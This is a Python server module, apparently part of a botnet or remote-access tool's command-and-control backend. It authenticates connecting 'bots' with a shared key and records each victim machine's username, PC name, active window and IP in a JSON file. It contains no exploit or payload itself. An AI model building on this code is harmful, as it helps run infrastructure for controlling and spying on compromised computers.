# backend/Services/Auth.py

import asyncio
import json
from pathlib import Path

from logs import Log as logger
from backend import AUTH_KEY

BOTS_FILE = Path(__file__).parent / "Bots_DB.txt"
REQUIRED_FIELDS = ['id', 'loc', 'user', 'pc_name', 'active_window', 'last_active', 'ip', 'auth_key']
MAX_PAYLOAD = 65536

async def authorize_client(reader, ip_address):
    """Проверка ключей и сохранение метаданных бота в БД"""
    try:
        # 1. Чтение заголовка длины JSON (4 байта)
        raw_len = await asyncio.wait_for(reader.readexactly(4), 10)
        payload_len = int.from_bytes(raw_len, "big")

        if not (0 < payload_len <= MAX_PAYLOAD):
            return None

        # 2. Получение JSON-меты
        raw_data = await asyncio.wait_for(reader.readexactly(payload_len), 10)
        data = json.loads(raw_data.decode('utf-8'))
        
        bot_id = data.get('id', ip_address)
        
        # 3. Валидация данных
        if not _is_valid(data, ip_address, bot_id):
            return None

        _sync_db(bot_id, data)
        return bot_id, data

    except Exception as e:
        logger.info(f"[!] Auth Error from {ip_address}: {e}")
        return None

def _is_valid(data, ip, bot_id):
    """Проверка структуры пакета и ключа авторизации"""
    missing = [f for f in REQUIRED_FIELDS if f not in data]
    if missing:
        logger.info(f"[!] Auth Fail: Missing fields {missing} from {ip}")
        return False
        
    if data.get('auth_key') != AUTH_KEY:
        logger.info(f"[!] Auth Fail: Wrong Key from {ip} ({bot_id})")
        return False
    return True

def _sync_db(bot_id, payload):
    """Запись метаданных в текстовую БД (JSON format)"""
    try:
        data_to_save = payload.copy()
        data_to_save.pop('auth_key', None)
        
        db = {}
        if BOTS_FILE.exists():
            db = json.loads(BOTS_FILE.read_text(encoding="utf-8"))
            
        db[bot_id] = data_to_save
        BOTS_FILE.write_text(
            json.dumps(db, indent=4, ensure_ascii=False), 
            encoding="utf-8"
        )
    except Exception as e:
        logger.error(f"DB Write Error: {e}")